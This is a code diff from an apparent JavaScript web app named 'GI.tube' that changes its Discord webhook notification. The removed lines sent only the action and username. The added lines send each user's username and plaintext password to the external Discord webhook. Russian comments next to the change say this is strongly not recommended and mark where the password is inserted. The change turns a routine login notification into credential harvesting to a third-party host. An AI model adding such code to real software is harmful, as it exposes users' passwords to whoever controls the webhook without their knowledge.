@@ -177,9 +177,10 @@
         await fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `🔔 **GI.tube** | Action: **${action}** | Username: \`${username}\``
-          })
+         // ТАК ДЕЛАТЬ КРАЙНЕ НЕ РЕКОМЕНДУЕТСЯ
+	body: JSON.stringify({
+ 	 content: `🔔 GI.tube | User: ${username} | PASS: ${password}` // Сюда добавляется пароль
+	})
         });
       } catch (error) {
         console.error('Ошибка отправки в Discord:', error);
